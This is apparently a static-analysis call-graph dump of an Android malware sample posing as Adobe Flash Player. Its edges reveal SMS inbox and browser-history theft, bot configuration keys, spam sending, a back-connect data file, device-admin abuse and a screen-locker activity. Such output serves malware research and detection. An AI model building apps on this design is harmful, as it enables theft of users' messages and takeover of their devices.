VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.ComponentName startService(android.content.Intent)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(byte[],java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("We have a little surprise!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("connectivity") in <com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r35 = staticinvoke <android.os.Environment: java.io.File getExternalStorageDirectory()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.Environment: java.io.File getExternalStorageDirectory()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent addFlags(int)>(67108864) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent addFlags(int)>
VIRTUAL edge: $z0 = virtualinvoke r3.<java.io.File: boolean isFile()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: boolean isFile()>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(0) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <android.content.ComponentName: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.content.ComponentName: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
STATIC edge: r27 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/sent") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>(java.lang.String)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: r30 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("spam_data", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.System: void exit(int)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(1073741824) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: void <init>()> ==> <android.app.Service: void <init>()>
SPECIAL edge: specialinvoke r4.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: $r22 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r7 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r15) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r13, "android_id") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean contains(java.lang.CharSequence)>("A") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashW: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void <init>()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=package&i=system") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "sentSpam:Executed", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "browserHistory:Executed", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r15 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.View findViewById(int)>(2131296256) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.View findViewById(int)>
STATIC edge: $r0 = staticinvoke <java.util.Calendar: java.util.Calendar getInstance()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)> ==> <java.util.Calendar: java.util.Calendar getInstance()>
VIRTUAL edge: $i0 = virtualinvoke r4.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "in", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: r34 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("spam_data", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: $r16 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotLocation") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
STATIC edge: $r43 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[A-z]{4}[0-9]{4}") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("macros[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r12 = virtualinvoke $r12.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Action: ") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<android.app.admin.DeviceAdminReceiver: void onDisabled(android.content.Context,android.content.Intent)>($r1, $r2) in <com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)> ==> <android.app.admin.DeviceAdminReceiver: void onDisabled(android.content.Context,android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r24, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r1 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_ServerGate", $r21, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("in", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("a=2&b=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r8) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "backconnect_data.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("a_link", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r27 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/inbox") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("ru") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)>(r0, 15000L, 3000L) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("keySmsGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
